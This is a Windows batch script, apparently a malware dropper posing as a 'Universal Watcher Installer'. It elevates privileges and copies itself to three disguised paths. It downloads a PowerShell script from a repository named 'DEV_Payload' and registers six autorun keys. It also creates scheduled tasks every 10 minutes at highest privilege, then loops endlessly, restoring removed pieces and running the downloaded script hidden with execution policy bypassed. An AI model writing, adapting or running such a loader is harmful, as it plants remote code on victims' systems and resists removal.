@echo off
:: ===============================================
:: UNIVERSAL WATCHER INSTALLER + MULTI-PERSISTENCE + ELEVATION
:: ===============================================

:: --- ELEVATE SCRIPT ---
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [INFO] Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Generate fake GUID-like suffixes
set "G1=71BD4F4C-9E84-47D1-AB91-4FABA1FCDD6B"
set "G2=F2B7E619-BE74-4846-8BD0-53484C3FCF79"
set "G3=59FBA7F0-70E4-45A3-BE34-DF98D783592F"

:: PowerShell script URL
set "SCRIPT_URL=https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1?nocache=%random%"

:: Batch file install paths
set "BAT1=%APPDATA%\UniversalWatcherInstaller_%G1%.bat"
set "BAT2=%ProgramData%\UniversalWatcherInstaller_%G2%.bat"
set "BAT3=%TEMP%\UniversalWatcherInstaller_%G3%.bat"

:: PowerShell script install paths
set "LOC1=%APPDATA%\UniversalWatcher_%G1%.ps1"
set "LOC2=%ProgramData%\UniversalWatcher_%G2%.ps1"
set "LOC3=%TEMP%\UniversalWatcher_%G3%.ps1"

:: Registry path
set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

:: Autorun registry keys
set "BATKEY1=UniversalWatcher_BAT_%G1%"
set "BATKEY2=UniversalWatcher_BAT_%G2%"
set "BATKEY3=UniversalWatcher_BAT_%G3%"
set "PSKEY1=UniversalWatcher_PS_%G1%"
set "PSKEY2=UniversalWatcher_PS_%G2%"
set "PSKEY3=UniversalWatcher_PS_%G3%"

:: Scheduled Task names
set "TASKNAME1=UniversalWatcherTask_%G1%"
set "TASKNAME2=UniversalWatcherTask_%G2%"
set "TASKNAME3=UniversalWatcherTask_%G3%"

:: ========================
:: Copy this batch file to multiple locations
:: ========================
echo [INFO] Saving batch file copies...
copy /y "%~f0" "%BAT1%"
copy /y "%~f0" "%BAT2%"
copy /y "%~f0" "%BAT3%"

:: ========================
:: Download PowerShell scripts
:: ========================
echo [INFO] Downloading PowerShell scripts...

powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC1%\" -Value $s"

powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC2%\" -Value $s"

powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC3%\" -Value $s"

:: ========================
:: Register autorun entries
:: ========================
echo [INFO] Registering autorun entries...
reg add "%REG_PATH%" /v "%BATKEY1%" /d "\"%BAT1%\"" /f
reg add "%REG_PATH%" /v "%BATKEY2%" /d "\"%BAT2%\"" /f
reg add "%REG_PATH%" /v "%BATKEY3%" /d "\"%BAT3%\"" /f
reg add "%REG_PATH%" /v "%PSKEY1%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC1%\"" /f
reg add "%REG_PATH%" /v "%PSKEY2%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC2%\"" /f
reg add "%REG_PATH%" /v "%PSKEY3%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC3%\"" /f

:: ========================
:: Create multiple scheduled tasks for extra persistence
:: ========================
echo [INFO] Creating scheduled tasks...
schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME1%" /tr "\"%BAT1%\"" /rl HIGHEST
schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME2%" /tr "\"%BAT2%\"" /rl HIGHEST
schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME3%" /tr "\"%BAT3%\"" /rl HIGHEST

:: ========================
:: Start the persistence loop
:: ========================
:loop

:: Ensure batch files exist
if not exist "%BAT1%" copy /y "%~f0" "%BAT1%"
if not exist "%BAT2%" copy /y "%~f0" "%BAT2%"
if not exist "%BAT3%" copy /y "%~f0" "%BAT3%"

:: Ensure PowerShell scripts exist
if not exist "%LOC1%" powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC1%\" -Value $s"

if not exist "%LOC2%" powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC2%\" -Value $s"

if not exist "%LOC3%" powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC3%\" -Value $s"

:: Re-register autorun entries if missing
reg query "%REG_PATH%" /v "%BATKEY1%" >nul 2>&1 || reg add "%REG_PATH%" /v "%BATKEY1%" /d "\"%BAT1%\"" /f
reg query "%REG_PATH%" /v "%BATKEY2%" >nul 2>&1 || reg add "%REG_PATH%" /v "%BATKEY2%" /d "\"%BAT2%\"" /f
reg query "%REG_PATH%" /v "%BATKEY3%" >nul 2>&1 || reg add "%REG_PATH%" /v "%BATKEY3%" /d "\"%BAT3%\"" /f
reg query "%REG_PATH%" /v "%PSKEY1%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY1%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC1%\"" /f
reg query "%REG_PATH%" /v "%PSKEY2%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY2%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC2%\"" /f
reg query "%REG_PATH%" /v "%PSKEY3%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY3%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC3%\"" /f

:: Execute the PowerShell scripts silently
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC1%"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC2%"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC3%"

:: Wait 10 seconds and repeat
timeout /t 10 >nul
goto loop
